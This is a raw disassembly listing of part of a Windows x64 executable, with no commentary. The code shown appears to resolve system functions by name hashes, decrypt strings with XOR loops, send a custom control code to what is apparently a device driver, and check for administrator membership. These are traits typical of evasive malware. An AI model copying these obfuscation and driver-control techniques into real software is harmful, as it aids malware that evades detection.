   140004f87:	48 8b 01             	mov    (%rcx),%rax
   140004f8a:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004f8e:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140004f94:	89 94 39 54 ff ff ff 	mov    %edx,-0xac(%rcx,%rdi,1)
   140004f9b:	48 8d 9f 60 ff ff ff 	lea    -0xa0(%rdi),%rbx
   140004fa2:	48 8d 05 e7 99 00 00 	lea    0x99e7(%rip),%rax        # 0x14000e990
   140004fa9:	48 89 03             	mov    %rax,(%rbx)
   140004fac:	48 83 bb 80 00 00 00 	cmpq   $0x0,0x80(%rbx)
   140004fb3:	00 
   140004fb4:	74 2f                	je     0x140004fe5
   140004fb6:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140004fba:	48 8d 43 70          	lea    0x70(%rbx),%rax
   140004fbe:	48 39 01             	cmp    %rax,(%rcx)
   140004fc1:	75 22                	jne    0x140004fe5
   140004fc3:	4c 8b 83 90 00 00 00 	mov    0x90(%rbx),%r8
   140004fca:	48 8b 93 88 00 00 00 	mov    0x88(%rbx),%rdx
   140004fd1:	48 89 11             	mov    %rdx,(%rcx)
   140004fd4:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140004fd8:	48 89 10             	mov    %rdx,(%rax)
   140004fdb:	44 2b c2             	sub    %edx,%r8d
   140004fde:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140004fe2:	44 89 00             	mov    %r8d,(%rax)
   140004fe5:	80 7b 7c 00          	cmpb   $0x0,0x7c(%rbx)
   140004fe9:	74 08                	je     0x140004ff3
   140004feb:	48 8b cb             	mov    %rbx,%rcx
   140004fee:	e8 4d 2e 00 00       	call   0x140007e40
   140004ff3:	48 8b cb             	mov    %rbx,%rcx
   140004ff6:	ff 15 0c 61 00 00    	call   *0x610c(%rip)        # 0x14000b108
   140004ffc:	90                   	nop
   140004ffd:	48 8d 8f 68 ff ff ff 	lea    -0x98(%rdi),%rcx
   140005004:	ff 15 4e 61 00 00    	call   *0x614e(%rip)        # 0x14000b158
   14000500a:	48 8b cf             	mov    %rdi,%rcx
   14000500d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005012:	48 83 c4 20          	add    $0x20,%rsp
   140005016:	5f                   	pop    %rdi
   140005017:	48 ff 25 e2 60 00 00 	rex.W jmp *0x60e2(%rip)        # 0x14000b100
   14000501e:	cc                   	int3
   14000501f:	cc                   	int3
   140005020:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140005025:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000502a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000502f:	55                   	push   %rbp
   140005030:	41 56                	push   %r14
   140005032:	41 57                	push   %r15
   140005034:	48 8d ac 24 50 fe ff 	lea    -0x1b0(%rsp),%rbp
   14000503b:	ff 
   14000503c:	48 81 ec b0 02 00 00 	sub    $0x2b0,%rsp
   140005043:	48 8b 05 f6 cf 00 00 	mov    0xcff6(%rip),%rax        # 0x140012040
   14000504a:	48 33 c4             	xor    %rsp,%rax
   14000504d:	48 89 85 a0 01 00 00 	mov    %rax,0x1a0(%rbp)
   140005054:	48 8b f9             	mov    %rcx,%rdi
   140005057:	48 89 4c 24 68       	mov    %rcx,0x68(%rsp)
   14000505c:	45 33 f6             	xor    %r14d,%r14d
   14000505f:	48 8d 0d f2 98 00 00 	lea    0x98f2(%rip),%rcx        # 0x14000e958
   140005066:	ff 15 9c 5f 00 00    	call   *0x5f9c(%rip)        # 0x14000b008
   14000506c:	48 85 c0             	test   %rax,%rax
   14000506f:	0f 84 d3 01 00 00    	je     0x140005248
   140005075:	ba ce c9 ca bd       	mov    $0xbdcac9ce,%edx
   14000507a:	48 8b c8             	mov    %rax,%rcx
   14000507d:	e8 ae f4 ff ff       	call   0x140004530
   140005082:	48 8b f0             	mov    %rax,%rsi
   140005085:	48 8b 15 cc 1d 02 00 	mov    0x21dcc(%rip),%rdx        # 0x140026e58
   14000508c:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005091:	e8 7a 12 00 00       	call   0x140006310
   140005096:	4c 8d 1d 2b 98 00 00 	lea    0x982b(%rip),%r11        # 0x14000e8c8
   14000509d:	48 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%rbx
   1400050a4:	4c 8b cb             	mov    %rbx,%r9
   1400050a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400050ae:	00 00 
   1400050b0:	49 ff c1             	inc    %r9
   1400050b3:	43 80 3c 0b 00       	cmpb   $0x0,(%r11,%r9,1)
   1400050b8:	75 f6                	jne    0x1400050b0
   1400050ba:	4d 8b d6             	mov    %r14,%r10
   1400050bd:	4c 39 35 94 1d 02 00 	cmp    %r14,0x21d94(%rip)        # 0x140026e58
   1400050c4:	76 4e                	jbe    0x140005114
   1400050c6:	4c 8d 3d 7b 1d 02 00 	lea    0x21d7b(%rip),%r15        # 0x140026e48
   1400050cd:	0f 1f 00             	nopl   (%rax)
   1400050d0:	4d 8b c7             	mov    %r15,%r8
   1400050d3:	48 83 3d 85 1d 02 00 	cmpq   $0xf,0x21d85(%rip)        # 0x140026e60
   1400050da:	0f 
   1400050db:	4c 0f 47 05 65 1d 02 	cmova  0x21d65(%rip),%r8        # 0x140026e48
   1400050e2:	00 
   1400050e3:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400050e8:	48 83 7d 88 0f       	cmpq   $0xf,-0x78(%rbp)
   1400050ed:	48 0f 47 4c 24 70    	cmova  0x70(%rsp),%rcx
   1400050f3:	33 d2                	xor    %edx,%edx
   1400050f5:	49 8b c2             	mov    %r10,%rax
   1400050f8:	49 f7 f1             	div    %r9
   1400050fb:	42 0f b6 04 1a       	movzbl (%rdx,%r11,1),%eax
   140005100:	43 32 04 10          	xor    (%r8,%r10,1),%al
   140005104:	42 88 04 11          	mov    %al,(%rcx,%r10,1)
   140005108:	49 ff c2             	inc    %r10
   14000510b:	4c 3b 15 46 1d 02 00 	cmp    0x21d46(%rip),%r10        # 0x140026e58
   140005112:	72 bc                	jb     0x1400050d0
   140005114:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005119:	48 83 7d 88 0f       	cmpq   $0xf,-0x78(%rbp)
   14000511e:	48 0f 47 4c 24 70    	cmova  0x70(%rsp),%rcx
   140005124:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140005129:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140005130:	00 
   140005131:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   140005138:	00 
   140005139:	45 33 c9             	xor    %r9d,%r9d
   14000513c:	45 33 c0             	xor    %r8d,%r8d
   14000513f:	ba 00 00 00 c0       	mov    $0xc0000000,%edx
   140005144:	ff d6                	call   *%rsi
   140005146:	48 8b f0             	mov    %rax,%rsi
   140005149:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000514d:	0f 85 6a 01 00 00    	jne    0x1400052bd
   140005153:	ff 15 b7 5e 00 00    	call   *0x5eb7(%rip)        # 0x14000b010
   140005159:	8b f0                	mov    %eax,%esi
   14000515b:	48 8b 15 b6 1c 02 00 	mov    0x21cb6(%rip),%rdx        # 0x140026e18
   140005162:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140005167:	e8 a4 11 00 00       	call   0x140006310
   14000516c:	4c 8d 15 4d 97 00 00 	lea    0x974d(%rip),%r10        # 0x14000e8c0
   140005173:	48 ff c3             	inc    %rbx
   140005176:	41 80 3c 1a 00       	cmpb   $0x0,(%r10,%rbx,1)
   14000517b:	75 f6                	jne    0x140005173
   14000517d:	4d 8b ce             	mov    %r14,%r9
   140005180:	4c 39 35 91 1c 02 00 	cmp    %r14,0x21c91(%rip)        # 0x140026e18
   140005187:	76 4c                	jbe    0x1400051d5
   140005189:	4c 8d 1d 78 1c 02 00 	lea    0x21c78(%rip),%r11        # 0x140026e08
   140005190:	4d 8b c3             	mov    %r11,%r8
   140005193:	48 83 3d 85 1c 02 00 	cmpq   $0xf,0x21c85(%rip)        # 0x140026e20
   14000519a:	0f 
   14000519b:	4c 0f 47 05 65 1c 02 	cmova  0x21c65(%rip),%r8        # 0x140026e08
   1400051a2:	00 
   1400051a3:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400051a8:	48 83 7c 24 58 0f    	cmpq   $0xf,0x58(%rsp)
   1400051ae:	48 0f 47 4c 24 40    	cmova  0x40(%rsp),%rcx
   1400051b4:	33 d2                	xor    %edx,%edx
   1400051b6:	49 8b c1             	mov    %r9,%rax
   1400051b9:	48 f7 f3             	div    %rbx
   1400051bc:	42 0f b6 04 12       	movzbl (%rdx,%r10,1),%eax
   1400051c1:	43 32 04 08          	xor    (%r8,%r9,1),%al
   1400051c5:	42 88 04 09          	mov    %al,(%rcx,%r9,1)
   1400051c9:	49 ff c1             	inc    %r9
   1400051cc:	4c 3b 0d 45 1c 02 00 	cmp    0x21c45(%rip),%r9        # 0x140026e18
   1400051d3:	72 bb                	jb     0x140005190
   1400051d5:	48 8d 15 84 12 02 00 	lea    0x21284(%rip),%rdx        # 0x140026460
   1400051dc:	48 83 3d 94 12 02 00 	cmpq   $0xf,0x21294(%rip)        # 0x140026478
   1400051e3:	0f 
   1400051e4:	44 8b ce             	mov    %esi,%r9d
   1400051e7:	48 0f 47 15 71 12 02 	cmova  0x21271(%rip),%rdx        # 0x140026460
   1400051ee:	00 
   1400051ef:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400051f4:	e8 07 f4 ff ff       	call   0x140004600
   1400051f9:	90                   	nop
   1400051fa:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
   1400051fe:	48 83 fa 0f          	cmp    $0xf,%rdx
   140005202:	76 32                	jbe    0x140005236
   140005204:	48 ff c2             	inc    %rdx
   140005207:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   14000520c:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140005213:	48 8b c1             	mov    %rcx,%rax
   140005216:	72 19                	jb     0x140005231
   140005218:	48 83 c2 27          	add    $0x27,%rdx
   14000521c:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140005220:	48 2b c1             	sub    %rcx,%rax
   140005223:	48 83 e8 08          	sub    $0x8,%rax
   140005227:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000522b:	0f 87 b9 01 00 00    	ja     0x1400053ea
   140005231:	e8 c6 35 00 00       	call   0x1400087fc
   140005236:	66 0f 6f 05 82 98 00 	movdqa 0x9882(%rip),%xmm0        # 0x14000eac0
   14000523d:	00 
   14000523e:	f3 0f 7f 45 80       	movdqu %xmm0,-0x80(%rbp)
   140005243:	c6 44 24 70 00       	movb   $0x0,0x70(%rsp)
   140005248:	48 8b 57 18          	mov    0x18(%rdi),%rdx
   14000524c:	48 83 fa 0f          	cmp    $0xf,%rdx
   140005250:	76 30                	jbe    0x140005282
   140005252:	48 ff c2             	inc    %rdx
   140005255:	48 8b 0f             	mov    (%rdi),%rcx
   140005258:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000525f:	72 1c                	jb     0x14000527d
   140005261:	48 83 c2 27          	add    $0x27,%rdx
   140005265:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140005269:	48 2b c8             	sub    %rax,%rcx
   14000526c:	48 83 e9 08          	sub    $0x8,%rcx
   140005270:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140005274:	0f 87 86 01 00 00    	ja     0x140005400
   14000527a:	48 8b c8             	mov    %rax,%rcx
   14000527d:	e8 7a 35 00 00       	call   0x1400087fc
   140005282:	c6 07 00             	movb   $0x0,(%rdi)
   140005285:	48 c7 47 18 0f 00 00 	movq   $0xf,0x18(%rdi)
   14000528c:	00 
   14000528d:	4c 89 77 10          	mov    %r14,0x10(%rdi)
   140005291:	48 8b 8d a0 01 00 00 	mov    0x1a0(%rbp),%rcx
   140005298:	48 33 cc             	xor    %rsp,%rcx
   14000529b:	e8 c0 32 00 00       	call   0x140008560
   1400052a0:	4c 8d 9c 24 b0 02 00 	lea    0x2b0(%rsp),%r11
   1400052a7:	00 
   1400052a8:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   1400052ac:	49 8b 73 30          	mov    0x30(%r11),%rsi
   1400052b0:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   1400052b4:	49 8b e3             	mov    %r11,%rsp
   1400052b7:	41 5f                	pop    %r15
   1400052b9:	41 5e                	pop    %r14
   1400052bb:	5d                   	pop    %rbp
   1400052bc:	c3                   	ret
   1400052bd:	4c 8b c7             	mov    %rdi,%r8
   1400052c0:	48 83 7f 18 0f       	cmpq   $0xf,0x18(%rdi)
   1400052c5:	76 03                	jbe    0x1400052ca
   1400052c7:	4c 8b 07             	mov    (%rdi),%r8
   1400052ca:	ba f4 01 00 00       	mov    $0x1f4,%edx
   1400052cf:	41 b9 f3 01 00 00    	mov    $0x1f3,%r9d
   1400052d5:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   1400052d9:	ff 15 01 61 00 00    	call   *0x6101(%rip)        # 0x14000b3e0
   1400052df:	c6 85 93 01 00 00 00 	movb   $0x0,0x193(%rbp)
   1400052e6:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   1400052eb:	48 8d 45 90          	lea    -0x70(%rbp),%rax
   1400052ef:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400052f4:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   1400052f9:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400052fe:	41 b9 f4 01 00 00    	mov    $0x1f4,%r9d
   140005304:	4c 8d 45 a0          	lea    -0x60(%rbp),%r8
   140005308:	ba 30 00 73 82       	mov    $0x82730030,%edx
   14000530d:	48 8b ce             	mov    %rsi,%rcx
   140005310:	ff 15 ea 5c 00 00    	call   *0x5cea(%rip)        # 0x14000b000
   140005316:	85 c0                	test   %eax,%eax
   140005318:	0f 85 8d 00 00 00    	jne    0x1400053ab
   14000531e:	ff 15 ec 5c 00 00    	call   *0x5cec(%rip)        # 0x14000b010
   140005324:	8b f0                	mov    %eax,%esi
   140005326:	48 8b 15 2b 1c 02 00 	mov    0x21c2b(%rip),%rdx        # 0x140026f58
   14000532d:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140005332:	e8 d9 0f 00 00       	call   0x140006310
   140005337:	4c 8d 15 92 95 00 00 	lea    0x9592(%rip),%r10        # 0x14000e8d0
   14000533e:	66 90                	xchg   %ax,%ax
   140005340:	48 ff c3             	inc    %rbx
   140005343:	41 80 3c 1a 00       	cmpb   $0x0,(%r10,%rbx,1)
   140005348:	75 f6                	jne    0x140005340
   14000534a:	4d 8b ce             	mov    %r14,%r9
   14000534d:	4c 39 35 04 1c 02 00 	cmp    %r14,0x21c04(%rip)        # 0x140026f58
   140005354:	0f 86 7b fe ff ff    	jbe    0x1400051d5
   14000535a:	4c 8d 1d e7 1b 02 00 	lea    0x21be7(%rip),%r11        # 0x140026f48
   140005361:	4d 8b c3             	mov    %r11,%r8
   140005364:	48 83 3d f4 1b 02 00 	cmpq   $0xf,0x21bf4(%rip)        # 0x140026f60
   14000536b:	0f 
   14000536c:	4c 0f 47 05 d4 1b 02 	cmova  0x21bd4(%rip),%r8        # 0x140026f48
   140005373:	00 
   140005374:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140005379:	48 83 7c 24 58 0f    	cmpq   $0xf,0x58(%rsp)
   14000537f:	48 0f 47 4c 24 40    	cmova  0x40(%rsp),%rcx
   140005385:	33 d2                	xor    %edx,%edx
   140005387:	49 8b c1             	mov    %r9,%rax
   14000538a:	48 f7 f3             	div    %rbx
   14000538d:	42 0f b6 04 12       	movzbl (%rdx,%r10,1),%eax
   140005392:	43 32 04 08          	xor    (%r8,%r9,1),%al
   140005396:	42 88 04 09          	mov    %al,(%rcx,%r9,1)
   14000539a:	49 ff c1             	inc    %r9
   14000539d:	4c 3b 0d b4 1b 02 00 	cmp    0x21bb4(%rip),%r9        # 0x140026f58
   1400053a4:	72 bb                	jb     0x140005361
   1400053a6:	e9 2a fe ff ff       	jmp    0x1400051d5
   1400053ab:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
   1400053af:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400053b3:	0f 86 7d fe ff ff    	jbe    0x140005236
   1400053b9:	48 ff c2             	inc    %rdx
   1400053bc:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   1400053c1:	48 8b c1             	mov    %rcx,%rax
   1400053c4:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400053cb:	0f 82 60 fe ff ff    	jb     0x140005231
   1400053d1:	48 83 c2 27          	add    $0x27,%rdx
   1400053d5:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400053d9:	48 2b c1             	sub    %rcx,%rax
   1400053dc:	48 83 e8 08          	sub    $0x8,%rax
   1400053e0:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400053e4:	0f 86 47 fe ff ff    	jbe    0x140005231
   1400053ea:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400053ef:	45 33 c9             	xor    %r9d,%r9d
   1400053f2:	45 33 c0             	xor    %r8d,%r8d
   1400053f5:	33 d2                	xor    %edx,%edx
   1400053f7:	33 c9                	xor    %ecx,%ecx
   1400053f9:	ff 15 19 5f 00 00    	call   *0x5f19(%rip)        # 0x14000b318
   1400053ff:	90                   	nop
   140005400:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140005405:	45 33 c9             	xor    %r9d,%r9d
   140005408:	45 33 c0             	xor    %r8d,%r8d
   14000540b:	33 d2                	xor    %edx,%edx
   14000540d:	33 c9                	xor    %ecx,%ecx
   14000540f:	ff 15 03 5f 00 00    	call   *0x5f03(%rip)        # 0x14000b318
   140005415:	cc                   	int3
   140005416:	cc                   	int3
   140005417:	cc                   	int3
   140005418:	cc                   	int3
   140005419:	cc                   	int3
   14000541a:	cc                   	int3
   14000541b:	cc                   	int3
   14000541c:	cc                   	int3
   14000541d:	cc                   	int3
   14000541e:	cc                   	int3
   14000541f:	cc                   	int3
   140005420:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005425:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000542a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000542f:	55                   	push   %rbp
   140005430:	41 54                	push   %r12
   140005432:	41 55                	push   %r13
   140005434:	41 56                	push   %r14
   140005436:	41 57                	push   %r15
   140005438:	48 8d 6c 24 c0       	lea    -0x40(%rsp),%rbp
   14000543d:	48 81 ec 40 01 00 00 	sub    $0x140,%rsp
   140005444:	48 8b 05 f5 cb 00 00 	mov    0xcbf5(%rip),%rax        # 0x140012040
   14000544b:	48 33 c4             	xor    %rsp,%rax
   14000544e:	48 89 45 38          	mov    %rax,0x38(%rbp)
   140005452:	33 f6                	xor    %esi,%esi
   140005454:	0f 57 c0             	xorps  %xmm0,%xmm0
   140005457:	0f 11 44 24 70       	movups %xmm0,0x70(%rsp)
   14000545c:	0f 57 c9             	xorps  %xmm1,%xmm1
   14000545f:	f3 0f 7f 4d 80       	movdqu %xmm1,-0x80(%rbp)
   140005464:	48 8d 15 55 86 00 00 	lea    0x8655(%rip),%rdx        # 0x14000dac0
   14000546b:	48 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%rbx
   140005472:	4c 8b c3             	mov    %rbx,%r8
   140005475:	49 ff c0             	inc    %r8
   140005478:	42 38 34 02          	cmp    %sil,(%rdx,%r8,1)
   14000547c:	75 f7                	jne    0x140005475
   14000547e:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005483:	e8 08 24 00 00       	call   0x140007890
   140005488:	90                   	nop
   140005489:	4c 8b 7d 80          	mov    -0x80(%rbp),%r15
   14000548d:	49 8b d7             	mov    %r15,%rdx
   140005490:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140005494:	e8 77 0e 00 00       	call   0x140006310
   140005499:	4c 8d 1d 30 94 00 00 	lea    0x9430(%rip),%r11        # 0x14000e8d0
   1400054a0:	4c 8b d3             	mov    %rbx,%r10
   1400054a3:	49 ff c2             	inc    %r10
   1400054a6:	43 80 3c 13 00       	cmpb   $0x0,(%r11,%r10,1)
   1400054ab:	75 f6                	jne    0x1400054a3
   1400054ad:	4c 8b ce             	mov    %rsi,%r9
   1400054b0:	4c 8b 75 88          	mov    -0x78(%rbp),%r14
   1400054b4:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   1400054b9:	4d 85 ff             	test   %r15,%r15
   1400054bc:	74 3a                	je     0x1400054f8
   1400054be:	66 90                	xchg   %ax,%ax
   1400054c0:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   1400054c5:	49 83 fe 0f          	cmp    $0xf,%r14
   1400054c9:	4c 0f 47 c7          	cmova  %rdi,%r8
   1400054cd:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   1400054d1:	48 83 7d d8 0f       	cmpq   $0xf,-0x28(%rbp)
   1400054d6:	48 0f 47 4d c0       	cmova  -0x40(%rbp),%rcx
   1400054db:	33 d2                	xor    %edx,%edx
   1400054dd:	49 8b c1             	mov    %r9,%rax
   1400054e0:	49 f7 f2             	div    %r10
   1400054e3:	42 0f b6 04 1a       	movzbl (%rdx,%r11,1),%eax
   1400054e8:	43 32 04 08          	xor    (%r8,%r9,1),%al
   1400054ec:	42 88 04 09          	mov    %al,(%rcx,%r9,1)
   1400054f0:	49 ff c1             	inc    %r9
   1400054f3:	4d 3b cf             	cmp    %r15,%r9
   1400054f6:	72 c8                	jb     0x1400054c0
   1400054f8:	48 8b 15 79 0f 02 00 	mov    0x20f79(%rip),%rdx        # 0x140026478
   1400054ff:	48 83 fa 0f          	cmp    $0xf,%rdx
   140005503:	76 30                	jbe    0x140005535
   140005505:	48 8b 0d 54 0f 02 00 	mov    0x20f54(%rip),%rcx        # 0x140026460
   14000550c:	48 ff c2             	inc    %rdx
   14000550f:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140005516:	72 18                	jb     0x140005530
   140005518:	48 83 c2 27          	add    $0x27,%rdx
   14000551c:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140005520:	48 2b c8             	sub    %rax,%rcx
   140005523:	48 83 e9 08          	sub    $0x8,%rcx
   140005527:	48 83 f9 1f          	cmp    $0x1f,%rcx
   14000552b:	77 70                	ja     0x14000559d
   14000552d:	48 8b c8             	mov    %rax,%rcx
   140005530:	e8 c7 32 00 00       	call   0x1400087fc
   140005535:	0f 10 45 c0          	movups -0x40(%rbp),%xmm0
   140005539:	0f 11 05 20 0f 02 00 	movups %xmm0,0x20f20(%rip)        # 0x140026460
   140005540:	0f 10 4d d0          	movups -0x30(%rbp),%xmm1
   140005544:	0f 11 0d 25 0f 02 00 	movups %xmm1,0x20f25(%rip)        # 0x140026470
   14000554b:	66 0f 6f 05 6d 95 00 	movdqa 0x956d(%rip),%xmm0        # 0x14000eac0
   140005552:	00 
   140005553:	f3 0f 7f 45 d0       	movdqu %xmm0,-0x30(%rbp)
   140005558:	c6 45 c0 00          	movb   $0x0,-0x40(%rbp)
   14000555c:	49 83 fe 0f          	cmp    $0xf,%r14
   140005560:	76 59                	jbe    0x1400055bb
   140005562:	49 8d 56 01          	lea    0x1(%r14),%rdx
   140005566:	48 8b c7             	mov    %rdi,%rax
   140005569:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140005570:	72 41                	jb     0x1400055b3
   140005572:	48 83 c2 27          	add    $0x27,%rdx
   140005576:	48 8b 7f f8          	mov    -0x8(%rdi),%rdi
   14000557a:	48 2b c7             	sub    %rdi,%rax
   14000557d:	48 83 e8 08          	sub    $0x8,%rax
   140005581:	48 83 f8 1f          	cmp    $0x1f,%rax
   140005585:	76 2c                	jbe    0x1400055b3
   140005587:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000558c:	45 33 c9             	xor    %r9d,%r9d
   14000558f:	45 33 c0             	xor    %r8d,%r8d
   140005592:	33 d2                	xor    %edx,%edx
   140005594:	33 c9                	xor    %ecx,%ecx
   140005596:	ff 15 7c 5d 00 00    	call   *0x5d7c(%rip)        # 0x14000b318
   14000559c:	90                   	nop
   14000559d:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400055a2:	45 33 c9             	xor    %r9d,%r9d
   1400055a5:	45 33 c0             	xor    %r8d,%r8d
   1400055a8:	33 d2                	xor    %edx,%edx
   1400055aa:	33 c9                	xor    %ecx,%ecx
   1400055ac:	ff 15 66 5d 00 00    	call   *0x5d66(%rip)        # 0x14000b318
   1400055b2:	90                   	nop
   1400055b3:	48 8b cf             	mov    %rdi,%rcx
   1400055b6:	e8 41 32 00 00       	call   0x1400087fc
   1400055bb:	89 75 e8             	mov    %esi,-0x18(%rbp)
   1400055be:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
   1400055c2:	48 8d 0d 8f 93 00 00 	lea    0x938f(%rip),%rcx        # 0x14000e958
   1400055c9:	ff 15 39 5a 00 00    	call   *0x5a39(%rip)        # 0x14000b008
   1400055cf:	4c 8b f0             	mov    %rax,%r14
   1400055d2:	48 85 c0             	test   %rax,%rax
   1400055d5:	0f 84 01 0a 00 00    	je     0x140005fdc
   1400055db:	ba 0f 07 b2 53       	mov    $0x53b2070f,%edx
   1400055e0:	48 8b c8             	mov    %rax,%rcx
   1400055e3:	e8 48 ef ff ff       	call   0x140004530
   1400055e8:	48 8b f8             	mov    %rax,%rdi
   1400055eb:	ba 25 57 f4 f8       	mov    $0xf8f45725,%edx
   1400055f0:	49 8b ce             	mov    %r14,%rcx
   1400055f3:	e8 38 ef ff ff       	call   0x140004530
   1400055f8:	48 85 ff             	test   %rdi,%rdi
   1400055fb:	0f 84 db 09 00 00    	je     0x140005fdc
   140005601:	48 85 c0             	test   %rax,%rax
   140005604:	0f 84 d2 09 00 00    	je     0x140005fdc
   14000560a:	48 8d 0d 57 93 00 00 	lea    0x9357(%rip),%rcx        # 0x14000e968
   140005611:	ff d7                	call   *%rdi
   140005613:	48 8b f8             	mov    %rax,%rdi
   140005616:	48 85 c0             	test   %rax,%rax
   140005619:	0f 84 bd 09 00 00    	je     0x140005fdc
   14000561f:	ba 33 62 44 95       	mov    $0x95446233,%edx
   140005624:	48 8b c8             	mov    %rax,%rcx
   140005627:	e8 04 ef ff ff       	call   0x140004530
   14000562c:	4c 8b e8             	mov    %rax,%r13
   14000562f:	ba 64 e8 dc fc       	mov    $0xfcdce864,%edx
   140005634:	48 8b cf             	mov    %rdi,%rcx
   140005637:	e8 f4 ee ff ff       	call   0x140004530
   14000563c:	4c 8b f8             	mov    %rax,%r15
   14000563f:	ba e5 0e 2c 2d       	mov    $0x2d2c0ee5,%edx
   140005644:	48 8b cf             	mov    %rdi,%rcx
   140005647:	e8 e4 ee ff ff       	call   0x140004530
   14000564c:	4c 8b e0             	mov    %rax,%r12
   14000564f:	4d 85 ed             	test   %r13,%r13
   140005652:	0f 84 6d 09 00 00    	je     0x140005fc5
   140005658:	4d 85 ff             	test   %r15,%r15
   14000565b:	0f 84 64 09 00 00    	je     0x140005fc5
   140005661:	48 85 c0             	test   %rax,%rax
   140005664:	0f 84 5b 09 00 00    	je     0x140005fc5
   14000566a:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%rbp)
   140005671:	66 c7 45 f4 00 05    	movw   $0x500,-0xc(%rbp)
   140005677:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   14000567b:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140005680:	89 74 24 48          	mov    %esi,0x48(%rsp)
   140005684:	89 74 24 40          	mov    %esi,0x40(%rsp)
   140005688:	89 74 24 38          	mov    %esi,0x38(%rsp)
   14000568c:	89 74 24 30          	mov    %esi,0x30(%rsp)
   140005690:	89 74 24 28          	mov    %esi,0x28(%rsp)
   140005694:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140005698:	41 b9 20 02 00 00    	mov    $0x220,%r9d
   14000569e:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   1400056a4:	b2 02                	mov    $0x2,%dl
   1400056a6:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400056aa:	41 ff d5             	call   *%r13
   1400056ad:	85 c0                	test   %eax,%eax
   1400056af:	74 14                	je     0x1400056c5
   1400056b1:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   1400056b5:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
   1400056b9:	33 c9                	xor    %ecx,%ecx
   1400056bb:	41 ff d7             	call   *%r15
   1400056be:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   1400056c2:	41 ff d4             	call   *%r12
   1400056c5:	ba ee c5 45 ab       	mov    $0xab45c5ee,%edx
   1400056ca:	49 8b ce             	mov    %r14,%rcx
   1400056cd:	e8 5e ee ff ff       	call   0x140004530
   1400056d2:	48 85 c0             	test   %rax,%rax
   1400056d5:	74 05                	je     0x1400056dc
   1400056d7:	48 8b cf             	mov    %rdi,%rcx
   1400056da:	ff d0                	call   *%rax
   1400056dc:	83 7d e8 00          	cmpl   $0x0,-0x18(%rbp)
   1400056e0:	0f 84 f6 08 00 00    	je     0x140005fdc
   1400056e6:	48 8d 0d 7b 92 00 00 	lea    0x927b(%rip),%rcx        # 0x14000e968
   1400056ed:	ff 15 25 59 00 00    	call   *0x5925(%rip)        # 0x14000b018
   1400056f3:	4c 8b e0             	mov    %rax,%r12
   1400056f6:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
   1400056fa:	48 85 c0             	test   %rax,%rax
